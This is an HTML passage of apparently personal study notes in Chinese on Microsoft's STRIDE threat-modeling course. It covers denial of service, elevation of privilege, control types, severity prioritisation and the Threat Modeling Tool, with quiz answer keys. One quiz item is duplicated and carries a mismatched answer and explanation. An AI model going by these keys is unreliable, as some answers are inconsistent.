srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向用户发送数据或从用户接收数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td align="left">数据流 &lt;-&gt; 信任边界</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">通过 Internet 将数据从受信任的环境传输给某人（反之亦然）</td></tr></tbody></table><h4 id="如何防止拒绝服务"><a href="#如何防止拒绝服务" class="headerlink" title="如何防止拒绝服务"></a>如何防止拒绝服务</h4><p>可用性确保系统为用户启动且正常运行。 示例包括：</p><ul><li>使用网络访问控制列表控制传入和传出的流量</li><li>使用弹性资源管理不断增加或减少的使用量</li><li>监视系统以检测是否出现异常</li><li>启用操作系统标志来处理内存和 CPU 进程</li></ul><h4 id="用于降低或消除风险的常用安全控制-4"><a href="#用于降低或消除风险的常用安全控制-4" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>访问控制列表 (ACL)</li><li>筛选</li><li>配额</li><li>授权</li><li>高可用性</li></ul><div class="note green"><p>推荐问题：我的服务在某些地区是否会被限制资源？</p></div><h4 id="知识检查-17"><a href="#知识检查-17" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对拒绝服务的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统依靠弹性资源来处理接收到的更多请求。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于否认性C. 这条陈述适用于拒绝服务。</psw></p><h3 id="权限提升-拥有本不应该有用的权限"><a href="#权限提升-拥有本不应该有用的权限" class="headerlink" title="权限提升 - 拥有本不应该有用的权限"></a>权限提升 - 拥有本不应该有用的权限</h3><p>个人未经许可访问资源时，就会发生权限提升。 示例包括：</p><ul><li>利用输入处理逻辑或内存中的弱点来提取数据</li><li>查找并使用特权帐户破坏服务（与欺骗和篡改威胁结合使用）</li></ul><h4 id="可能面临权限提升-风险的元素和交互"><a href="#可能面临权限提升-风险的元素和交互" class="headerlink" title="可能面临权限提升 风险的元素和交互"></a>可能面临权限提升 风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务将数据发送到另一个任务</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">任务接收来自用户的数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">任务接收来自数据存储的数据</td></tr></tbody></table><h4 id="如何防止权限提升"><a href="#如何防止权限提升" class="headerlink" title="如何防止权限提升"></a>如何防止权限提升</h4><p>授权确保用户拥有适当的权限。 示例包括：</p><ul><li>实现授权机制以验证对数据和资源的权限</li><li>应用安全控制，以使用最少的访问权限运行服务</li><li>监视访问以检测异常和未经授权的访问尝试。</li></ul><h4 id="用于降低或消除风险的常用安全控制-5"><a href="#用于降低或消除风险的常用安全控制-5" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>访问控制列表 (ACL)</li><li>基于角色的访问控制 (RBAC)</li><li>基于组的访问</li><li>权限</li><li>输入验证</li></ul><div class="note green"><p>推荐问题：如何得知用户可以执行此操作？</p></div><h4 id="知识检查-18"><a href="#知识检查-18" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对权限提升的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 系统使用尽可能少的权限运行进程。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 这条陈述适用于权限提升。B. 此消息适用于欺骗。C. 这条陈述适用于否认性。</psw></p><h3 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h3><h4 id="摘要-2"><a href="#摘要-2" class="headerlink" title="摘要"></a>摘要</h4><p>威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除系统风险的方法。 了解每种威胁类别及其相应的安全控制。</p><p>本模块涵盖了以下内容：</p><ul><li>讨论了威胁建模框架中的每种威胁类别</li><li>了解了有助于降低或消除风险的安全控制</li></ul><div class="note green"><p>你知道吗？ 可以使用许多其他框架来实现不同的目标。 例如，渗透测试团队可将 LINDDUN 用于隐私威胁和攻击树。 攻击树有助于通过“假定违规”思维来确定攻击可能发生的方式。</p></div><h4 id="了解详细信息-1"><a href="#了解详细信息-1" class="headerlink" title="了解详细信息"></a>了解详细信息</h4><ul><li><a href="https://www.linddun.org/">LINDDUN</a> - 一种隐私威胁建模方法，支持分析人员系统地查找和解决软件体系结构中的隐私威胁。</li><li><a href="https://www.microsoft.com/security/blog/2016/11/28/disrupting-the-kill-chain/">网络终止链</a> - 介绍典型的工作流，包括攻击者用于渗入组织网络和系统的技术、策略和过程。</li><li>补上一个微软安全博客 （ <a href="https://www.microsoft.com/security/blog/">https://www.microsoft.com/security/blog/</a></li></ul><h2 id="模块6-设置问题的优先级并应用安全控制措施"><a href="#模块6-设置问题的优先级并应用安全控制措施" class="headerlink" title="模块6 | 设置问题的优先级并应用安全控制措施"></a>模块6 | 设置问题的优先级并应用安全控制措施</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>威胁建模框架可以帮助你生成威胁列表和降低风险的方法，但不会为你确定其优先级。</p><p>此外，它不会基于安全控制措施的类型和功能提供分层建议，因此更难确定要实现哪些控制措施。</p><h4 id="确实问题的优先级"><a href="#确实问题的优先级" class="headerlink" title="确实问题的优先级"></a>确实问题的优先级</h4><p>确定问题的优先级是威胁建模中一个重要的部分。 在资源有限的情况下，它可以帮助将资源分配给最关键的问题。</p><p>示例包括：</p><ul><li>必须选择是要实现记录所有管理操作的功能，还是使用 SSL/TLS 对流量进行加密</li><li>确定是先实现访问控制列表，还是先增强系统的输入验证过程</li></ul><h4 id="何时设置优先级"><a href="#何时设置优先级" class="headerlink" title="何时设置优先级"></a>何时设置优先级</h4><p>根据每个问题的风险因素对其指定优先级。 此外，选择可与其他措施联用的安全控制措施，可帮助为你的系统提供分层安全保护机制。</p><p>此过程可能需要一段时间才能完成。 还需要同事和安全团队的帮助。 请留出足够的时间来与其协作。</p><h4 id="学习目标-5"><a href="#学习目标-5" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>对问题分配优先级</li><li>对安全控制进行分类</li><li>了解每个安全控制措施类型和功能</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="问题优先级、安全控制措施类型和功能"><a href="#问题优先级、安全控制措施类型和功能" class="headerlink" title="问题优先级、安全控制措施类型和功能"></a>问题优先级、安全控制措施类型和功能</h3><p>威胁建模练习可帮助你发现一些问题，有时还会有意想不到的收获。 缺少优先级可能会让工程师感到不知所措，无法确定要首先解决哪些问题。</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>首先，确定问题对于系统的重要程度。 然后，<u>选择有利于以最低的成本提供最大程度保护的安全控制措施</u>。</p><h4 id="确定安全问题的优先级"><a href="#确定安全问题的优先级" class="headerlink" title="确定安全问题的优先级"></a>确定安全问题的优先级</h4><p>根据风险严重性来确定安全问题的优先级。 各组织的标签可能不同。 但通常会根据威胁被攻击者利用时带来的风险影响，以从严重到低风险的模式设置优先级标签。</p><h4 id="类型和功能"><a href="#类型和功能" class="headerlink" title="类型和功能"></a>类型和功能</h4><p>安全控制具有不同的类型和功能。</p><p>有三个主要的类别可帮助你关注安全性的三种形式。</p><p>示例包括：</p><ul><li>物理：摄像头、徽章和围栏</li><li>技术：加密、虚拟防火墙和防病毒软件</li><li>管理：策略、法规和书面要求</li></ul><p>功能的意义在于针对潜在威胁每个阶段帮助保护系统。</p><p>示例包括：</p><ul><li>用锁防止入侵</li><li>安装摄像头来检测入侵</li><li>制定入侵响应计划</li><li>修复由入侵导致的破坏</li><li>使用标志和其他安全控制措施防患于未然</li></ul><p>在接下来的几个单元中，我们将了解优先级、类型和功能。</p><h3 id="设置安全问题的优先级"><a href="#设置安全问题的优先级" class="headerlink" title="设置安全问题的优先级"></a>设置安全问题的优先级</h3><p>生成包含降低或消除风险的方法的威胁列表。 然后，与同事合作分配优先级。</p><h4 id="选择优先级框架"><a href="#选择优先级框架" class="headerlink" title="选择优先级框架"></a>选择优先级框架</h4><p>优先级练习应遵循组织创建的内部安全 bug 栏。</p><p>Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考：</p><p>Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考：</p><table><thead><tr><th align="left">图标</th><th align="left">严重性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><img src="/img/thread-modeling/critical.png" class="lazyload" data-srcset="/img/thread-modeling/critical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="critical"></td><td align="left">严重</td><td align="left">可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁</td></tr><tr><td align="left"><img src="/img/thread-modeling/important.png" class="lazyload" data-srcset="/img/thread-modeling/important.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="important"></td><td align="left">重要说明</td><td align="left">可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用</td></tr><tr><td align="left"><img src="/img/thread-modeling/moderate.png" class="lazyload" data-srcset="/img/thread-modeling/moderate.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="moderate"></td><td align="left">适中</td><td align="left">可能对系统用户造成中等程度的影响。 示例包括存在可能的解决方法的可用性问题</td></tr><tr><td align="left"><img src="/img/thread-modeling/low.png" class="lazyload" data-srcset="/img/thread-modeling/low.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="low"></td><td align="left">低</td><td align="left">可能会对系统用户造成轻微影响</td></tr><tr><td align="left"><img src="/img/thread-modeling/information.png" class="lazyload" data-srcset="/img/thread-modeling/information.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="information"></td><td align="left">信息</td><td align="left">已考虑、评估潜在威胁并认为它无关紧要</td></tr></tbody></table><h4 id="知识检查-19"><a href="#知识检查-19" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>可能会对用户造成严重影响的问题通常属于哪个优先级？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 重要说明。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 严重。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 适中。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用。B. 可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁。C. 可能对系统用户造成中等程度的影响。 示例包括存在可能的解决方法的可用性问题。 （Emmm 感觉 B 也行？</psw></p><h3 id="安全控制措施类型和功能-1"><a href="#安全控制措施类型和功能-1" class="headerlink" title="安全控制措施类型和功能"></a>安全控制措施类型和功能</h3><p>确定每个问题的优先级后，请查看安全控制措施列表，并选择对你的系统最有益的选项。</p><p>最有益的安全控制措施一般会跨多个 STRIDE 类别。 在大多数情况下，实现这些步骤的成本相对较低。</p><h4 id="安全控制措施类型"><a href="#安全控制措施类型" class="headerlink" title="安全控制措施类型"></a>安全控制措施类型</h4><p>评估每项安全控制措施时，你会注意到它们属于以下类型之一：</p><table><thead><tr><th align="left">图标</th><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><img src="/img/thread-modeling/physical.png" class="lazyload" data-srcset="/img/thread-modeling/physical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="physical"></td><td align="left">物理</td><td align="left">此类控制措施从物理上阻止或检测未经授权的访问。 示例包括入口、徽章、摄像头、照明和抑制系统。</td></tr><tr><td align="left"><img src="/img/thread-modeling/technical.png" class="lazyload" data-srcset="/img/thread-modeling/technical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="technical"></td><td align="left">技术</td><td align="left">此类控制措施从逻辑上保护系统。 示例包括防火墙、防病毒软件、访问控制列表和加密。</td></tr><tr><td align="left"><img src="/img/thread-modeling/administrative.png" class="lazyload" data-srcset="/img/thread-modeling/administrative.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="administrative"></td><td align="left">管理</td><td align="left">此类控制措施指为系统定义流程的策略。 示例包括数据分类、审核和限制。</td></tr></tbody></table><div class="note info"><p>根据系统，你需要应用各种类型的安全控制措施，帮助建立多层保护以提升系统的安全性。</p></div><h4 id="安全控制功能"><a href="#安全控制功能" class="headerlink" title="安全控制功能"></a>安全控制功能</h4><p>除了这三种主要类型外，安全控制还具有五个不同的功能，可帮助你应用多个安全层。</p><table><thead><tr><th align="left">函数</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">预防</td><td align="left">此策略是否有助于降低此威胁的概率或影响？</td><td align="left">锁定、防火墙、数据分类。</td></tr><tr><td align="left">检测</td><td align="left">此策略是否有助于识别所发生的系统攻击？</td><td align="left">监视、诱捕系统、审核日志。</td></tr><tr><td align="left">纠正</td><td align="left">此策略是否有助于控制如何响应传入攻击？</td><td align="left">物理修复、系统修补程序、事件响应计划。</td></tr><tr><td align="left">恢复</td><td align="left">此风险缓解措施是否有助于服务从攻击中恢复？</td><td align="left">热站点、系统备份、灾难恢复计划。</td></tr><tr><td align="left">阻碍</td><td align="left">此风险缓解措施是否有助于阻止攻击者访问系统？</td><td align="left">时限、最低权限、授权使用策略。</td></tr></tbody></table><div class="note green"><p>根据问题的优先级，可以考虑在系统被破坏之前、破坏过程中和破坏之后使用多项安全控制功能来保护它。</p></div><h4 id="如何综合利用所有信息"><a href="#如何综合利用所有信息" class="headerlink" title="如何综合利用所有信息"></a>如何综合利用所有信息</h4><p>它们与安全控制措施类型共同形成一个矩阵，可帮助你做出正确的选择。 以下是一些示例：</p><table><thead><tr><th align="left">功能</th><th align="left">物理</th><th align="left">逻辑</th><th align="left">管理</th></tr></thead><tbody><tr><td align="left">预防</td><td align="left">锁定</td><td align="left">防火墙</td><td align="left">数据分类</td></tr><tr><td align="left">检测</td><td align="left">监视</td><td align="left">诱捕系统</td><td align="left">审核日志</td></tr><tr><td align="left">纠正</td><td align="left">物理修复</td><td align="left">系统修补程序</td><td align="left">事件响应计划</td></tr><tr><td align="left">恢复</td><td align="left">热站点</td><td align="left">系统备份</td><td align="left">灾难恢复计划</td></tr><tr><td align="left">阻碍</td><td align="left">时限</td><td align="left">最低权限</td><td align="left">授权使用策略</td></tr></tbody></table><h4 id="知识检查-20"><a href="#知识检查-20" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>管理安全控制措施有什么示例？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 创建事件响应计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 安装新防火墙。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 在入口添加徽章扫描仪。</p>            </div><ol start="2"><li>管理安全控制措施有什么示例？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 创建事件响应计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 安装新防火墙。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 在入口添加徽章扫描仪。</p>            </div><p>参考答案：</p><ol><li><psw>== A ==</psw></li><li><psw>== C ==</psw></li></ol><p>解释：</p><ol><li><psw>A. 此条目适用于管理型安全控制措施。B. 此条目适用于逻辑型（可能还有物理型）安全控制措施。C. 此条目适用于物理型安全控制措施。</psw></li><li><psw>A. 此条目适用于预防性安全控制功能。B. 此条目适用于检测性安全控制功能。C. 此条目适用于矫正性安全控制功能。</psw></li></ol><h3 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h3><p>威胁建模框架会为你提供威胁列表，并提供降低或消除风险的方法。 但是，它不会为你确定威胁的优先级。 此外，没有基于其类型和功能的分层安全控制建议。</p><p>你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。</p><p>在本模块中，你已经学习了以下内容：</p><ul><li>了解了如何确定问题的优先级</li><li>分类安全控制</li><li>了解每个型安全控制措施和功能</li></ul><h2 id="模块7-使用推荐工具创建数据流图"><a href="#模块7-使用推荐工具创建数据流图" class="headerlink" title="模块7 | 使用推荐工具创建数据流图"></a>模块7 | 使用推荐工具创建数据流图</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>数据流关系图是系统工作方式的图形化表示形式。 这包括所有数据存储、进程、外部实体、信任边界和数据流。</p><h4 id="如何创建数据流关系图"><a href="#如何创建数据流关系图" class="headerlink" title="如何创建数据流关系图"></a>如何创建数据流关系图</h4><p>你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 但是，确实需要了解威胁建模的原理，才能正确地对其进行分析。</p><p>某些应用程序提供的多种工具，它们可以通过威胁生成引擎和风险降低策略，帮助你创建数据流关系图。 其他工具仅提供创建数据流关系图的功能。</p><h4 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a>目标</h4><p>该学习路径的目标是让你了解威胁建模的基础知识，以便在任何地方、任何画布上进行威胁建模。</p><p>为了帮助你实现这个目标，我们会在介绍过程中推荐一些工具。</p><h4 id="学习目标-6"><a href="#学习目标-6" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将学习以下内容：</p><ul><li>详细了解了 Threat Modeling Tool</li><li>详细了解 Visio</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="建议的工具"><a href="#建议的工具" class="headerlink" title="建议的工具"></a>建议的工具</h3><p>威胁建模将对你的数据流关系图应用一个框架，以帮助找到降低或消除风险的威胁和方法。</p><p>某些工具可帮助你创建数据流关系图，另一些还可以帮助你进行威胁生成练习。 根据你在威胁建模方面的专业水平，其中一些工具可能会很有帮助。</p><h4 id="详细了解-Threat-Modeling-Tool"><a href="#详细了解-Threat-Modeling-Tool" class="headerlink" title="详细了解 Threat Modeling Tool"></a>详细了解 Threat Modeling Tool</h4><p>在接下来的几个单元中，你将了解有关一些工具的详细信息：</p><ul><li>Threat Modeling Tool 提供多种工具，可用于创建数据流关系图并对其进行分析，以查找潜在威胁和风险降低策略<ul><li>在线安装版，<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>离线安装版，<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> （2016）</li><li>想装其他离线版本的，Guguru 一下 <u>microsoft threat modeling tool offline installer</u> 就好了</li></ul></li><li>Visio 提供了一个干净的画布，帮助你创建数据流关系图<ul><li>Visio，（要钱的 打扰了</li></ul></li></ul><p>我们将在接下来的几个单元中进行介绍。</p><h3 id="Threat-Modeling-Tool"><a href="#Threat-Modeling-Tool" class="headerlink" title="Threat Modeling Tool"></a>Threat Modeling Tool</h3><p>Microsoft Threat Modeling Tool 由 Microsoft 发布，并获得威胁建模社区进行认可，可以帮助工程师创建数据流关系图并将 STRIDE 应用于其威胁建模工作。</p><p>Threat Modeling Tool 提供：</p><ul><li>可自定义的模板</li><li>威胁生成引擎，其中包含威胁和风险降低策略</li></ul><p>默认模板称为“SDL TM 知识库”，提供一组基本元素和威胁生成功能。 只要对数据流关系图和 STRIDE 有基本的了解即可使用。</p><h4 id="STRIDE-回顾"><a href="#STRIDE-回顾" class="headerlink" title="STRIDE 回顾"></a>STRIDE 回顾</h4><p>STRIDE 是六个主要威胁类别的首字母缩写：</p><ul><li>欺骗 - 冒充某人或某物</li><li>篡改 - 未经授权更改数据</li><li>否认性 - 不宣称对执行的操作负责</li><li>信息泄露 - 在未获得权限的情况下查看数据</li><li>拒绝服务 - 使系统过载</li><li>权限提升 - 拥有本不应拥有的权限</li></ul><h4 id="高级用户部分"><a href="#高级用户部分" class="headerlink" title="高级用户部分"></a>高级用户部分</h4><p>对于更高级的用户，可以在三个主要部分对模板进行自定义。</p><h5 id="模具"><a href="#模具" class="headerlink" title="模具"></a>模具</h5><p>进程、外部实体、数据存储、数据流和信任边界构成了父元素。</p><p><img src="/img/thread-modeling/parentstencils.jpeg" class="lazyload" data-srcset="/img/thread-modeling/parentstencils.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="parentstencils"></p><p>你还可以创建子元素，以帮助为其他上下文、可操作的威胁生成和风险降低策略提供粒度。</p><p><img src="/img/thread-modeling/expandedflowstencils.jpeg" class="lazyload" data-srcset="/img/thread-modeling/expandedflowstencils.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="expandedflowstencils"></p><h6 id="子元素的工作原理示例"><a href="#子元素的工作原理示例" class="headerlink" title="子元素的工作原理示例"></a>子元素的工作原理示例</h6><p>父元素提供了选择 HTTP 和 HTTPS 子元素的选项。</p><p>HTTP 应生成更多的威胁，因为篡改、信息泄露和欺骗威胁常见于未加密通道。</p><p><strong>使用 HTTP</strong></p><p><img src="/img/thread-modeling/http.jpeg" class="lazyload" data-srcset="/img/thread-modeling/http.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="http"></p><p><strong>使用 HTTPS</strong></p><p><img src="/img/thread-modeling/https.jpeg" class="lazyload" data-srcset="/img/thread-modeling/https.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="https"></p><h6 id="如何添加元素属性"><a 